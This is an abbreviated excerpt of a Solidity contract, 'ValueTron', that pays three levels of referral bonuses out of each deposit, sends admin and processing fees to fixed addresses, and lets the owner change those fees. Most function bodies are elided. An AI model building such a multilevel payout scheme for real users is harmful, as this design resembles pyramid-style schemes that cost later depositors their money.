...
contract ValueTron {
    ...
    constructor(address payable _owner, address payable _admin_fee,address payable _etherchain_fund) public {
        owner = _owner;
  ...
  function checkTRXContractBalance( uint _amount) external {
    ...
    function _deposit(address _addr, uint256 _amount) private {
        ...
        if(users[_addr].upline != address(0)) {
            ...
            address cref1 = users[cref].upline;
            address cref2 = users[cref1].upline;
            if(cref == address(0)) cref = owner;
            if(cref1 == address(0)) cref1 = owner;
            if(cref2 == address(0)) cref2 = owner;

            users[cref].direct_bonus += _amount * 5 / 100;
            emit DirectPayout(cref, _addr, _amount * 5 / 100);
            users[cref1].direct_bonus += _amount * 3 / 100;
            emit DirectPayout(cref1, _addr, _amount * 3 / 100);
            users[cref2].direct_bonus += _amount * 2 / 100;
            emit DirectPayout(cref2, _addr, _amount * 2 / 100);
        }
        ...
        admin_fee.transfer((_amount * ads) / 100);
        etherchain_fund.transfer((_amount * processing_fee) / 100);
    ...
    */
    ...
    function updateProcessingAndAdsFee(uint _ads,uint _processingFee) external{
        require(msg.sender==owner,'Permission denied');
        ads = _ads;
